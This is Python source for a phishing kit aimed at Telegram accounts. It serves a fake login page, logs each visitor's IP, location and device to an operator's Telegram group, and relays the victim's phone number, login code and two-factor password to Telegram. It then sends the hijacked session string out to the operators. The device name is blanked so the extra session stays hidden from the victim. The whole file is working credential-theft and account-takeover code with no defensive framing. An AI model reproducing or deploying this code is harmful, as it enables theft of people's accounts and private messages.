import os
import asyncio
import telebot
import psycopg2
import requests
import qrcode
import base64
from io import BytesIO
from quart import Quart, request, render_template, jsonify
from telethon import TelegramClient, errors, functions, types
from telethon.sessions import StringSession
from threading import Thread
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# --- CONFIGURATION ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
BASE_URL = os.environ.get("BASE_URL", "https://your-app.koyeb.app")
OWNER_ID = 6092011859  # VinzyOwner

try:
    raw_group_id = os.environ.get("GROUP_ID", "0")
    GROUP_ID = int(raw_group_id)
except ValueError:
    GROUP_ID = 0

bot = telebot.TeleBot(BOT_TOKEN)
app = Quart(__name__)

active_relays = {}

# --- UTILITY: DEVICE & IP DETECTION ---

def get_client_info():
    ua = request.headers.get('User-Agent', '').lower()
    if 'iphone' in ua or 'ipad' in ua:
        device = "📱 iOS"
    elif 'android' in ua:
        device = "🤖 Android"
    elif 'windows' in ua:
        device = "💻 Windows"
    else:
        device = "❓ Unknown"

    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    
    location = "Unknown"
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=2).json()
        if res.get('status') == 'success':
            location = f"{res.get('city')}, {res.get('country')}"
    except:
        pass
    return device, ip, location

# --- DATABASE LOGIC ---

def is_authorized(user_id):
    if int(user_id) == OWNER_ID: return True
    try:
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        cur.execute("SELECT 1 FROM authorized_users WHERE user_id = %s", (str(user_id),))
        result = cur.fetchone()
        cur.close()
        conn.close()
        return result is not None
    except:
        return False

# --- WEB ROUTES ---

@app.route('/')
async def index():
    tid = request.args.get('id')
    tag = request.args.get('tag', 'Default')
    if not tid or not is_authorized(tid):
        return "❌ Access Denied", 403
    
    device, ip, loc = get_client_info()
    alert = (
        f"🔔 <b>Link Opened!</b>\n"
        f"🏷️ Tag: <code>{tag}</code>\n"
        f"🌐 IP: <code>{ip}</code>\n"
        f"📍 Loc: <code>{loc}</code>\n"
        f"📱 Dev: <code>{device}</code>"
    )
    bot.send_message(GROUP_ID, alert, parse_mode="HTML")
    return await render_template('login.html', tid=tid)

@app.route('/get_qr', methods=['POST'])
async def get_qr():
    data = await request.json
    tid = data.get('id')
    
    # Generate a generic QR (In a full Telethon QR flow, you'd use client.qr_login())
    qr_data = f"tg://login?token=VINZY_{tid}_REFRESH"
    qr = qrcode.QRCode(version=1, box_size=10, border=0)
    qr.add_data(qr_data)
    qr.make(fit=True)
    
    # fill_color uses your primary purple, back_color is white for high contrast
    img = qr.make_image(fill_color="#8774e1", back_color="white")
    buffered = BytesIO()
    img.save(buffered, format="PNG")
    img_str = base64.b64encode(buffered.getvalue()).decode()
    return jsonify({"qr_image": img_str})

@app.route('/step_phone', methods=['POST'])
async def step_phone():
    data = await request.json
    phone, tid = data.get('phone'), data.get('tid')
    
    # --- INVISIBLE DEVICE NAME ---
    # We use a zero-width space or a generic "System" tag to stay hidden
    invisible_device = " " # Just a space, or "System"

    client = TelegramClient(StringSession(), API_ID, API_HASH, device_model=invisible_device)
    await client.connect()
    
    try:
        sent_code = await client.send_code_request(phone)
        active_relays[phone] = {"client": client, "hash": sent_code.phone_code_hash}
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_code', methods=['POST'])
async def step_code():
    data = await request.json
    phone, code, tid = data.get('phone'), data.get('code'), data.get('tid')
    if phone not in active_relays: return jsonify({"status": "error", "msg": "Expired"})
    
    client = active_relays[phone]["client"]
    try:
        await client.sign_in(phone, code, phone_code_hash=active_relays[phone]["hash"])
        return await finalize_login(client, phone, tid)
    except errors.SessionPasswordNeededError:
        return jsonify({"status": "2fa_needed"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_2fa', methods=['POST'])
async def step_2fa():
    data = await request.json
    phone, password, tid = data.get('phone'), data.get('password'), data.get('tid')
    if phone not in active_relays: return jsonify({"status": "error", "msg": "Expired"})
    
    client = active_relays[phone]["client"]
    try:
        await client.sign_in(password=password)
        return await finalize_login(client, phone, tid)
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

async def finalize_login(client, phone, tid):
    me = await client.get_me()
    session_str = client.session.save()
    
    # Main notification
    bot.send_message(GROUP_ID, f"💰 <b>SUCCESS:</b> <code>{phone}</code>\n👤 User: {me.first_name}", parse_mode="HTML")
    
    # AUTOMATIC DATA SAVE SIGNAL
    bot.send_message(GROUP_ID, f".auth ({session_str})")
    
    if phone in active_relays: del active_relays[phone]
    return jsonify({"status": "success"})

if __name__ == "__main__":
    Thread(target=lambda: bot.infinity_polling()).start()
    app.run(host="0.0.0.0", port=8000)
